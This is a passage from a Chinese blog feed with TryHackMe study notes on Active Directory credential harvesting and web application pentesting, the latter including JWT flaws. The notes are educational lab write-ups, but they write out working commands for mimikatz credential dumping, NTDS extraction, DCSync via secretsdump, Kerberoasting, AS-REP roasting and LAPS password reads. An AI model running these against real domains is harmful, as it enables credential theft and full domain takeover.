的一项安全功能，旨在防止恶意脚本在未经用户许可的情况下运行。它有以下几种模式：</p><ul><li><strong>Restricted</strong>：最严格的模式，不允许任何脚本运行。</li><li><strong>AllSigned</strong>：只允许运行由可信发布者签名的脚本。</li><li><strong>RemoteSigned</strong>：允许运行自己创建的本地脚本，但要求从网上下载的脚本必须经过签名。</li><li><strong>Bypass</strong>：<strong>最宽松的模式</strong>，绕过所有执行策略，允许任何脚本运行，没有警告或提示。</li></ul><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">powershell </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ex bypass</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 载入模块</span></span><span class="line"><span style="color: #56B6C2">Import-Module</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">C:\Tools\Get-WebCredentials.ps1</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 导出 Web 凭证</span></span><span class="line"><span style="color: #56B6C2">Get-WebCredentials</span></span></code></pre></div></div></figure><h3 id="RunAs"><a href="#RunAs" class="headerlink" title="RunAs"></a>RunAs</h3><p>可以使用保存的凭据运行 RunAs 载入凭据</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 查看保存的凭据</span></span><span class="line"><span style="color: #E06C75">cmdkey</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">list</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 使用 thm.</span><span style="color: #E06C75">red</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">thm</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">local</span><span style="color: #ABB2BF"> 凭据运行 cmd</span></span><span class="line"><span style="color: #E06C75">runas</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">savecred</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:thm.</span><span style="color: #E06C75">red</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">thm</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">local</span><span style="color: #ABB2BF"> cmd.exe</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">type </span><span style="color: #98C379">&quot;c:\Users\thm-local\Saved Games\flag.txt&quot;</span></span></code></pre></div></div></figure><h3 id="Mimikatz-提取密码"><a href="#Mimikatz-提取密码" class="headerlink" title="Mimikatz 提取密码"></a>Mimikatz 提取密码</h3><p>用这个就可以直接提取明文密码了</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">c:\Tools\Mimikatz\</span><span style="color: #56B6C2">mimikatz.exe</span></span><span class="line"><span style="color: #ABB2BF">privilege::debug</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 如果报错就用解锁 LSASS 方法跑一遍</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 导出凭据</span></span><span class="line"><span style="color: #ABB2BF">sekurlsa::credman</span></span></code></pre></div></div></figure><h2 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h2><p>这一节就讲了如何本地和远程提取域控的 Hash。</p><h3 id="NTDS-Domain-Controller"><a href="#NTDS-Domain-Controller" class="headerlink" title="NTDS Domain Controller"></a>NTDS Domain Controller</h3><p>新技术目录服务 (NTDS) 是一个包含所有 Active Directory 数据（包括对象、属性、凭证等）的数据库。NTDS.DTS 数据由以下三个表组成：</p><ul><li>Schema table: it contains types of objects and their relationships.</li><li>Link table: it contains the object’s attributes and their values.</li><li>Data type: It contains users and groups.</li></ul><p>NTDS 默认位于 C:\Windows\NTDS，并已加密，以防止从目标计算机提取数据。从运行的机器访问 NTDS.dit 文件是不允许的，因为该文件被 Active Directory 使用并锁定。不过，有多种方法可以访问该文件。本任务将讨论如何使用 ntdsutil 和 Diskshadow 工具获取 NTDS 文件的副本，最后讨论如何转储文件内容。需要注意的是，解密 NTDS 文件需要使用系统引导密钥来尝试解密 LSA 隔离凭据，该凭据存储在 SECURITY 文件系统中。因此，我们还必须转储包含所有解密所需文件的安全文件。</p><h3 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h3><p>Ntdsutil 是一款 Windows 实用程序，用于管理和维护 Active Directory 配置。它可用于各种情况，如</p><ul><li>恢复 Active Directory 中已删除的对象。</li><li>执行 AD 数据库维护</li><li>活动目录快照管理。</li><li>设置目录服务还原模式 (DSRM) 管理员密码。</li></ul><p>参考 <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)">Microsoft documentation</a>。</p><h3 id="本地-Dump（无凭证）"><a href="#本地-Dump（无凭证）" class="headerlink" title="本地 Dump（无凭证）"></a>本地 Dump（无凭证）</h3><p>如果您没有可用的凭证，但有域控制器的管理员访问权限，通常会这样做。因此，我们将依靠 Windows 实用程序来转储 NTDS 文件并离线破解它们。首先，我们假设自己拥有域控制器的管理员权限。<br>要成功转储 NTDS 文件的内容，我们需要以下文件：</p><ul><li>C:\Windows\NTDS\ntds.dit</li><li>C:\Windows\System32\config\SYSTEM</li><li>C:\Windows\System32\config\SECURITY</li></ul><p>下面是一条单行 PowerShell 命令，使用 Ntdsutil 工具转储 C:\temp 目录中的 NTDS 文件。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 本地导出 NTDS</span></span><span class="line"><span style="color: #ABB2BF">powershell </span><span style="color: #98C379">&quot;ntdsutil.exe &#39;ac i ntds&#39; &#39;ifm&#39; &#39;create full c:\temp&#39; q q&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 把文件传到自己的机器上运行 impacket 脚本</span></span><span class="line"><span style="color: #ABB2BF">python secretsdump.py </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">security </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">home</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">kali</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">thm</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">20250808</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">SECURITY </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">system </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">home</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">kali</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">thm</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">20250808</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">SYSTEM </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ntds </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">home</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">kali</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">thm</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">20250808</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">ntds.dit local</span></span></code></pre></div></div></figure><h3 id="远程-Dump（有凭证）"><a href="#远程-Dump（有凭证）" class="headerlink" title="远程 Dump（有凭证）"></a>远程 Dump（有凭证）</h3><p>在上一节中，我们讨论了如何在没有凭证的情况下从内存中获取哈希值。在本任务中，我们将演示如何远程转储系统和域控制器哈希值，这需要密码或 NTLM 哈希值等凭证。我们还需要具有域控制器管理访问权限或特殊权限的用户的凭据。</p><h4 id="DC-Sync"><a href="#DC-Sync" class="headerlink" title="DC Sync"></a>DC Sync</h4><p>DC Sync 是在 Active Directory 环境中执行的一种流行攻击，用于远程转储凭据。当具有以下 AD 权限的账户（具有必要权限的特殊账户）或 AD 管理账户受到攻击时，这种攻击就会起作用：</p><ul><li>Replicating Directory Changes</li><li>Replicating Directory Changes All</li><li>Replicating Directory Changes in Filtered Set</li></ul><p>攻击者会利用这些配置来执行域复制，通常称为 “DC Sync ”或 “域控制器同步”。</p><p>可以用 mimikatz 工具执行 DC Sync 攻击，不过这里用 Impacket SecretsDump 远程实现。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 远程导出 NTDS 他还会导出 Kerberos 密钥</span></span><span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">secretsdump.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-just-dc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">THM.red/thm@10.201.48.121</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 会提示你输入密码</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 远程导出 NTLM</span></span><span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">secretsdump.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-just-dc-ntlm</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">THM.red/thm@10.201.48.121</span></span></code></pre></div></div></figure><h2 id="Local-Administrator-Password-Solution-LAPS"><a href="#Local-Administrator-Password-Solution-LAPS" class="headerlink" title="Local Administrator Password Solution (LAPS)"></a>Local Administrator Password Solution (LAPS)</h2><h3 id="组策略首选项（Group-Policy-Preferences-GPP）"><a href="#组策略首选项（Group-Policy-Preferences-GPP）" class="headerlink" title="组策略首选项（Group Policy Preferences, GPP）"></a>组策略首选项（Group Policy Preferences, GPP）</h3><p>Windows 操作系统有一个内置的管理员账户，可以通过密码访问。在拥有大量计算机的 Windows 环境中更改密码是一项挑战。因此，微软实现了一种方法，允许管理员使用组策略首选项（GPP）在所有工作站上更改本地管理员账户。</p><p>GPP 是一种工具，允许管理员创建包含嵌入式凭据的域策略。一旦部署了 GPP，SYSVOL 文件夹中会创建不同的 XML 文件。SYSVOL 是 Active Directory 的一个关键组件，它在 NTFS 卷上创建一个共享目录，所有经过身份验证的域用户都可以以读取权限访问。</p><p>问题在于，这些与 GPP 相关的 XML 文件中包含一个使用 AES-256 位加密的密码。在当时，这种加密强度被认为是足够的，直到微软<strong>不知何故在其 <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">MSDN</a> 网站上发布了私钥</strong>。由于域用户可以读取 SYSVOL 文件夹的内容，因此解密存储的密码变得轻而易举。用于破解 SYSVOL 加密密码的工具之一就是 <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword</a>。</p><h3 id="Local-Administrator-Password-Solution-LAPS-1"><a href="#Local-Administrator-Password-Solution-LAPS-1" class="headerlink" title="Local Administrator Password Solution (LAPS)"></a>Local Administrator Password Solution (LAPS)</h3><p>2015 年，微软不再将加密密码存储在 SYSVOL 文件夹中。他们引入了 <strong>本地管理员密码解决方案（LAPS）</strong>，这是一种更安全的远程管理本地管理员密码的方法。</p><p>这种新方法在 Active Directory 的计算机对象中添加了两个新的属性：<code>ms-mcs-AdmPwd</code> 和 <code>ms-mcs-AdmPwdExpirationTime</code>。<code>ms-mcs-AdmPwd</code> 属性包含本地管理员的<strong>明文密码</strong>，而 <code>ms-mcs-AdmPwdExpirationTime</code> 则包含密码的重置过期时间。LAPS 使用 <code>admpwd.dll</code> 来更改本地管理员密码并更新 <code>ms-mcs-AdmPwd</code> 的值。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 检查 LAPS 是否开启</span></span><span class="line"><span style="color: #ABB2BF">dir </span><span style="color: #98C379">&quot;C:\Program Files\LAPS\CSE&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 检查是否有对 AdmPwd 可用的 cmdlets</span></span><span class="line"><span style="color: #56B6C2">Get-Command</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">AdmPwd</span><span style="color: #56B6C2">*</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">CommandType     Name                              </span></span><span class="line"><span style="color: #56B6C2">-----------</span><span style="color: #ABB2BF">     </span><span style="color: #56B6C2">----</span><span style="color: #ABB2BF">                              </span></span><span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Find-AdmPwdExtendedRights</span><span style="color: #ABB2BF">         </span></span><span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Get-AdmPwdPassword</span><span style="color: #ABB2BF">                </span></span><span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Reset-AdmPwdPassword</span><span style="color: #ABB2BF">              </span></span><span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Set-AdmPwdAuditing</span><span style="color: #ABB2BF">                </span></span><span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Set-AdmPwdComputerSelfPermission</span><span style="color: #ABB2BF">  </span></span><span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Set-AdmPwdReadPasswordPermission</span><span style="color: #ABB2BF">  </span></span><span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Set-AdmPwdResetPasswordPermission</span><span style="color: #ABB2BF"> </span></span><span class="line"><span style="color: #ABB2BF">Cmdlet          </span><span style="color: #56B6C2">Update-AdmPwdADSchema</span></span></code></pre></div></div></figure><p>可以使用 <code>-Identity *</code> 参数列出所有可用的 OU。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 找哪个 AD OU 拥有处理 LAPS 的 “所有扩展权限 ”属性</span></span><span class="line"><span style="color: #56B6C2">Find-AdmPwdExtendedRights</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity THMorg</span></span><span class="line"><span style="color: #ABB2BF">ObjectDN                                      ExtendedRightHolders</span></span><span class="line"><span style="color: #56B6C2">--------</span><span style="color: #ABB2BF">                                      </span><span style="color: #56B6C2">--------------------</span></span><span class="line"><span style="color: #ABB2BF">OU</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">THMorg,DC</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">thm,DC</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">red                       {THM\LAPsReader}</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 检查组</span></span><span class="line"><span style="color: #ABB2BF">net groups </span><span style="color: #98C379">&quot;LAPsReader&quot;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">Members</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-------------------------------------------------------------------------------</span></span><span class="line"><span style="color: #ABB2BF">bk</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">admin</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 获取 bk-admin 用户权限后，可以用下面这个命令获取 LAPS 密码</span></span><span class="line"><span style="color: #56B6C2">Get-AdmPwdPassword</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ComputerName creds</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">harvestin</span></span></code></pre></div></div></figure><p>需要注意的是，在实际的 AD 环境中，LAPS 只在特定的计算机上启用。因此，您需要枚举并找到正确的目标计算机以及正确的用户账户，才能获取 LAPS 密码。有很多脚本可以帮助实现这一点，但我们在 C:\Tool 中包含了  <a href="https://github.com/leoloobeek/LAPSToolkit">LAPSToolkit</a> PowerShell 脚本，可以试用一下。</p><h2 id="其他攻击方式"><a href="#其他攻击方式" class="headerlink" title="其他攻击方式"></a>其他攻击方式</h2><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>Kerberoasting 是一种常见的 AD 攻击，用于获取有助于持久性的 AD 票据。要使这种攻击奏效，攻击者必须能访问 SPN（服务主名）账户，如 IIS User、MSSQL 等。Kerberoasting 攻击涉及请求 Ticket Granting Ticket (TGT) 和 Ticket Granting Service (TGS)。这种攻击的最终目的是实现权限升级和横向网络移动。<br>让我们快速演示一下该攻击。首先，我们需要找到 SPN 账户，然后发送请求以获取 TGS 票据。我们将使用 GetUserSPNs.python 脚本从 AttackBox 执行 Kerberoasting 攻击。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># SPN 枚举</span></span><span class="line"><span style="color: #ABB2BF">python GetUserSPNs.py </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">dc</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ip </span><span style="color: #D19A66">10.201</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">48.121</span><span style="color: #ABB2BF"> THM.red</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">thm</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 请求 TGS 票据</span></span><span class="line"><span style="color: #ABB2BF">python GetUserSPNs.py </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">dc</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ip </span><span style="color: #D19A66">10.201</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">80.121</span><span style="color: #ABB2BF"> THM.red</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">thm </span><span style="color: #56B6C2">-request-user</span><span style="color: #ABB2BF"> svc</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">thm</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 爆破 TGS</span></span><span class="line"><span style="color: #ABB2BF">hashcat hash.txt rockyou.txt</span></span></code></pre></div></div></figure><h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>AS-REP Roasting 是一种使攻击者能够检索账户选项设置为“不需要 Kerberos 预验证“的 AD 用户密码哈希值的技术。</p><p>该选项依赖于旧的 Kerberos 身份验证协议，该协议允许在没有密码的情况下进行身份验证。</p><p>获得哈希值后，我们可以尝试离线破解，最后，如果可以破解，我们就得到了密码！</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">GetNPUsers.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-dc-ip</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.201</span><span style="color: #98C379">.80.121</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm.red/</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-usersfile</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/tmp/users.txt</span></span></code></pre></div></div></figure><p>还有一些玩过的：</p><ul><li>SMB 中继</li><li>LLMNR &#x2F; NBNS 投毒</li></ul><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>其实主要就那几个方向，收集用户机器上的密码，比如说密码管理器，浏览器，转储 LSASS。之后呢，拿到了权限可以用 dcsync 拿下金票，那些 LAPS 不太懂，估计碰不上。</p><p>可以尝试使用以下工具来扫描目标机器。</p><ul><li><a href="https://github.com/SnaffCon/Snaffler">Snaffler</a></li><li><a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></li><li><a href="https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/">Lazagne</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;这是我在 &lt;a href=&quot;https://tryhackme.com/&quot;&gt;TryHackMe&lt;/a&gt; 里面学习 Windows Activ</summary>
      
    
    
    
    <category term="THM" scheme="https://blog.irec.moe/categories/THM/"/>
    
    
    <category term="Windows" scheme="https://blog.irec.moe/tags/Windows/"/>
    
    <category term="Active Directory" scheme="https://blog.irec.moe/tags/Active-Directory/"/>
    
  </entry>
  
  <entry>
    <title>Try Hack Me - Web Application Pentesting</title>
    <link href="https://blog.irec.moe/thm_wap.html"/>
    <id>https://blog.irec.moe/thm_wap.html</id>
    <published>2025-07-16T16:00:00.000Z</published>
    <updated>2025-08-30T00:37:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>前言：感觉纯粹是为了记录而记录的，回过头来看，基本上忘记的差不多了，只有一个大概的印象，看来之后回去还是得要复习一下，不过也留了记录了，之后这个笔记会完善的。</p><p>可以看看之后的 WP，比如说 AD、Red Teaming 那些，大部分都是我通关一遍之后再来单独整理的，有自己的理解的文字。</p><h1 id="枚举与暴力破解"><a href="#枚举与暴力破解" class="headerlink" title="枚举与暴力破解"></a>枚举与暴力破解</h1><h2 id="认证枚举的目的"><a href="#认证枚举的目的" class="headerlink" title="认证枚举的目的"></a>认证枚举的目的</h2><ul><li>鉴别有效用户名</li><li>密码规则</li></ul><h3 id="常见枚举地方"><a href="#常见枚举地方" class="headerlink" title="常见枚举地方"></a>常见枚举地方</h3><ul><li>注册页<ul><li>可以看到用户名或者密码被使用了没有</li></ul></li><li>密码重置功能<ul><li>通过后端的反应来判断用户名是否存在</li></ul></li><li>错误信息</li><li>数据泄露<ul><li>比如说一个人的信息肯定会有复用的地方</li></ul></li></ul><h2 id="通过详细错误枚举用户邮箱"><a href="#通过详细错误枚举用户邮箱" class="headerlink" title="通过详细错误枚举用户邮箱"></a>通过详细错误枚举用户邮箱</h2><p><strong>可以从系统详细错误里面容易泄露的有：</strong></p><ul><li>内部路径</li><li>数据库详情</li><li>用户信息</li></ul><p><strong>诱发详细错误的方法</strong>：</p><ul><li>无效的登录<ul><li>试着输一点错误的用户名和密码试试</li></ul></li><li>SQL 注入</li><li>文件包含、路径穿越</li><li>篡改表单</li><li>Fuzz</li></ul><p>通过登录功能，如果提示邮箱不存在，则可以通过遍历邮箱来找到存在的邮箱地址。</p><h2 id="通过密码重置的逻辑来破解"><a href="#通过密码重置的逻辑来破解" class="headerlink" title="通过密码重置的逻辑来破解"></a>通过密码重置的逻辑来破解</h2><p>一般密码重置有以下几种方法</p><ul><li>基于邮箱的重置</li><li>基于安全问题的重置</li><li>基于短信的重置</li></ul><p>而每个方法都有他的弱点</p><ul><li>可预测的 Token<ul><li>token 有规律，或者 token 可以被爆破，也就是有效性没有做限制</li></ul></li><li>Token 有效期</li><li>校验强度不够<ul><li>比如说问题太常见了</li></ul></li><li>信息泄露<ul><li>会泄露用户名或者邮箱，以提供更多线索</li></ul></li><li>不安全的传输<ul><li>没用 HTTPS，可能会被劫持</li></ul></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>后面的就是一个爆破密码重置 token，和一个爆破 HTTP Basic 认证的。然后说了一下信息收集的手段，网页时光机和搜索引擎的语法。</p><h1 id="Session-管理"><a href="#Session-管理" class="headerlink" title="Session 管理"></a>Session 管理</h1><p>这一章就说了一下 Cookie 和 Session 的区别，然后演示了一下客户端这边改 session 字段达到垂直越权。</p><h1 id="JWT-安全"><a href="#JWT-安全" class="headerlink" title="JWT 安全"></a>JWT 安全</h1><h2 id="JSON-Web-Tokens"><a href="#JSON-Web-Tokens" class="headerlink" title="JSON Web Tokens"></a>JSON Web Tokens</h2><h3 id="JWT-结构"><a href="#JWT-结构" class="headerlink" title="JWT 结构"></a>JWT 结构</h3><p>JWT 由三部分组成，每部分都是由 Base64Url 编码的，用 <code>.</code> 隔开。</p><ul><li>头部<ul><li>通常表示了这是什么类型的 token 和用了哪种加密算法</li></ul></li><li>载荷<ul><li>是 token 的主体，里面包含 claims。 claims 是为特定实现提供的一条信息。在 JWT 中有注册声明，以及公共和私有声明。</li></ul></li><li>签名<ul><li>签名是验证 token 有效性的一种方法，签名所用的算法在头部中有写明</li></ul></li></ul><h3 id="签名算法"><a href="#签名算法" class="headerlink" title="签名算法"></a>签名算法</h3><ul><li>None<ul><li>字面意思，没有算法，实际上是一个没有签名的 JWT</li></ul></li><li>对称签名<ul><li>HS256，他会使用一个<strong>共享的密钥 (secret key)</strong> 来计算 JWT 的头部和载荷的哈希值。</li><li>签名包含的内容：<strong>Base64Url 编码后的头部 + 一个点 (<code>.</code>) + Base64Url 编码后的载荷</strong></li></ul></li><li>不对称签名<ul><li>RS256，先生成 hash，然后用私钥加密这个 hash。</li></ul></li></ul><h2 id="敏感字段泄露"><a href="#敏感字段泄露" class="headerlink" title="敏感字段泄露"></a>敏感字段泄露</h2><ol><li><strong>敏感信息被直接包含在 JWT 的 <code>payload</code> 中</strong>。比如 <code>password</code> 和 <code>flag</code> 这样的敏感数据，不应该被直接放到 JWT 中，因为 JWT 会被发送到客户端。由于 JWT 的 <code>payload</code> 只是经过 Base64 编码，未加密，任何拿到 JWT 的人都可以轻易解码并查看其中的内容。</li><li><strong>后端不应盲目信任 <code>payload</code> 中的敏感数据</strong>。服务器端在收到 JWT 并验证其签名后，不应该直接使用 <code>payload</code> 中可能包含的敏感信息（如 <code>password</code> 或 <code>flag</code>）。这些敏感信息<strong>不应由客户端提供</strong>。</li><li><strong>正确的做法是从后端数据库中查找敏感数据</strong>。当服务器需要这些敏感信息时，它应该从 JWT 中提取非敏感的用户标识符（比如 <code>username</code>），然后使用这个标识符去自己的后端数据库中安全地查询并获取真正的敏感数据（比如用户的权限、角色、<code>flag</code> 值等）。</li></ol><h2 id="签名验证错误"><a href="#签名验证错误" class="headerlink" title="签名验证错误"></a>签名验证错误</h2><h3 id="不验证签名"><a href="#不验证签名" class="headerlink" title="不验证签名"></a>不验证签名</h3><h4 id="利用签名未验证漏洞进行攻击"><a href="#利用签名未验证漏洞进行攻击" class="headerlink" title="利用签名未验证漏洞进行攻击"></a>利用签名未验证漏洞进行攻击</h4><p>正如你所说，攻击者利用这个缺陷的方式就是：</p><ol><li><strong>篡改 <code>payload</code> 内容：</strong> 攻击者可以修改 JWT <code>payload</code> 中的任何信息，例如将 <code>admin</code> 字段从 <code>0</code> 改为 <code>1</code>。</li><li><strong>删除或忽略签名：</strong> 因为服务器根本不验证签名，所以攻击者甚至可以删除 JWT 的签名部分（第三部分），或者直接随便填一个错误的签名，服务器仍然会接受。</li><li><strong>冒充高权限用户：</strong> 攻击者可以伪造一个 <code>admin: 1</code> 的 JWT，然后冒充管理员用户进行请求，从而达到获取敏感信息（如 <code>flag</code>）的目的。</li></ol><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><p>修复这个漏洞的方法非常直接和关键：<strong>始终验证 JWT 签名。</strong></p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> jwt.</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(token, </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.secret, </span><span style="color: #E06C75; font-style: italic">algorithms</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;HS256&quot;</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure><ul><li>通过提供 <code>secret</code>（对于对称签名算法如 HS256）或 <code>public key</code>（对于非对称签名算法如 RS256），JWT 解码库会强制进行签名验证。</li><li>只有当 JWT 的签名是使用正确的密钥生成的，且 JWT 的头部和载荷内容与签名匹配时，<code>jwt.decode</code> 才会成功，否则会抛出验证错误。</li></ul><h3 id="签名可被降级"><a href="#签名可被降级" 